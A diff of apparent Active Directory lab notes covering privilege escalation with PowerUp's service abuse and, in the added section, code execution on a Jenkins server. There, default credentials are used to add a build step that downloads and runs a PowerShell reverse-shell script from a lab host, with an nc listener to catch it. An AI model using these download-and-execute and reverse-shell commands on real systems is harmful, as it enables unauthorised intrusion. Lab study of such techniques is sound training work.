@@ -3,11 +3,11 @@ Task 1:
 -> RunWithRegistryNonAdmin.bat
 -> . C:\AD\Tools\PowerUp.ps1
 -> Invoke-AllChecks  (Checking for unquote service path to exploit )
--> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
+-> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\studentx -Verbose
  *Just logoff and logon again and we have local administrator privileges! *
 
 Task 2:
-Check where studentx has local administrative access use Find-PSRemotingLocalAdminAccess.ps1:
+identify a machine in the domain where studentx has local administrative access use Find-PSRemotingLocalAdminAccess.ps1:
 From CMD run command:
 -> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 From Powershell
@@ -20,4 +20,14 @@ dcorp-blabla
 -> set computername
 
 Now as Above we successfully Access system as administrator
+..........................................................................................................................
+* get admin privileges on the dcorp-ci server from jankins RCE
+1. Open Jankins Instance And do login using default credentials 
+2. Navigate to Any project and go to configure and Go to Add Build Steps Select Execute Windows batch command and Paste below Code 
+-> powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
+Notw make sure Invoke-PowerShellTcp.ps1 should present in your hfs server from student machine
+And Run nc from student machine to get Reverse shell back:
+-> nc64.exe -lvp 443
+
+
 
